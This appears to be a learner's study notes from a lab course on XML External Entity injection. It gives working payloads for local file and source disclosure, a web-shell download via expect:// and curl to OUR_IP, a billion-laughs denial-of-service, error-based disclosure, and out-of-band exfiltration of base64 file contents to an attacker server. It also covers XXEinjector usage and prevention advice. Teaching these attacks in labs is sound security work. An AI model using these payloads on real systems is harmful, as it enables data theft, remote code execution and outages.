`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.
## XML
`Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications.
## XML DTD
`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:
```
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
## XML Entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value, as follows:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can `reference External XML Entities` with the `SYSTEM` keyword, which is followed by the external entity's path, as follows:

# Local File Disclosure
![](Pasted%20image%2020260717162916.png)
We see that the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.
```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Now, we should have a new XML entity called `company`, which we can reference with `&company;`. So, instead of using our email in the `email` element, let us try using `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):
![](Pasted%20image%2020260717162939.png)
As we can see, the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value. `This confirms that we are dealing with a web application vulnerable to XXE`.

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

## Reading Sensitive Files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it, as we have learned in the previous section:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
![](Pasted%20image%2020260717163124.png)
## Reading Source Code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a `Whitebox Penetration Test` to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

So, let us see if we can use the same attack to read the source code of the `index.php` file, as follows:
![](Pasted%20image%2020260717163150.png)
As we can see, this did not work, as we did not get any content. This happened because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. 
Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
![](Pasted%20image%2020260717163351.png)
`This trick only works with PHP web applications.` The next section will discuss a more advanced method for reading source code, which should work with any web framework.

## Remote Code Execution with XXE
```
MarcosV999@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
MarcosV999@htb[/htb]$ sudo python3 -m http.server 80
```
Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

**Note:** The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

## Other XXE Attacks
Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability. The [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks) module thoroughly covers SSRF, and the same techniques can be carried with XXE attacks.
Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

`this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Try it against this exercise, and see if it works.

# Advanced File Disclosure
To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
`this will not work, since XML prevents joining internal and external entities`, so we will have to find a better way to do so.
To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD.
```
<!ENTITY joined "%begin;%file;%end;">
```
So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as follows:
```
MarcosV999@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
MarcosV999@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:

```dtd
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe; <!-- **Entidades de parámetro (como `%nombre;`):** Solo se pueden usar dentro de la **DTD (Document Type Definition)** -->
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Once we write our `xxe.dtd` file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the `submitDetails.php` file:
As we can see, we were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords.
**Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.
## Error Based XXE

Let's consider the exercise we have in `/error` at the end of this section, in which none of the XML input entities is displayed on the screen. Because of this, we have no entity that we can control to write the file output. First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity, as follows:
![](Pasted%20image%2020260718123038.png)
We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

Now, we can call our external DTD script, and then reference the `error` entity, as follows:
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the `/etc/hosts` file as follows:
![](Pasted%20image%2020260718123311.png)
This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.

# Blind Data Exfiltration
## Out-of-band Data Exfiltration
our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:
```
MarcosV999@htb[/htb]$ vi index.php # here we write the above PHP code
MarcosV999@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
Then, we can send our request to the web application:
![](Pasted%20image%2020260718221206.png)

## Automated OOB Exfiltration
One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:
```
MarcosV999@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```
Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
```
MarcosV999@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
```
MarcosV999@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

# XXE Prevention
## Avoiding Outdated Components
While other input validation web vulnerabilities are usually prevented through secure coding practices (e.g., XSS, IDOR, SQLi, OS Injection), this is not entirely necessary to prevent XXE vulnerabilities. This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.
In addition to updating the XML libraries, we should also update any components that parse XML input, such as API libraries like SOAP. Furthermore, any document or file processors that may perform XML parsing, like SVG image processors or PDF document processors, may also be vulnerable to XXE vulnerabilities, and we should update them as well.
These issues are not exclusive to XML libraries only, as the same applies to all other web components (e.g., outdated `Node Modules`). In addition to common package managers (e.g. `npm`), common code editors will notify web developers of the use of outdated components and suggest other alternatives. In the end, `using the latest XML libraries and web development components can greatly help reduce various web vulnerabilities`, including XXE.
## Using Safe XML Configurations
Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include:
- Disable referencing custom `Document Type Definitions (DTDs)`
- Disable referencing `External XML Entities`
- Disable `Parameter Entity` processing
- Disable support for `XInclude`
- Prevent `Entity Reference Loops`

Another thing we saw was Error-based XXE exploitation. So, we should always have proper exception handling in our web applications and `should always disable displaying runtime errors in web servers`.
With the various issues and vulnerabilities introduced by XML data, many also recommend `using other formats, such as JSON or YAML`. This also includes avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST).
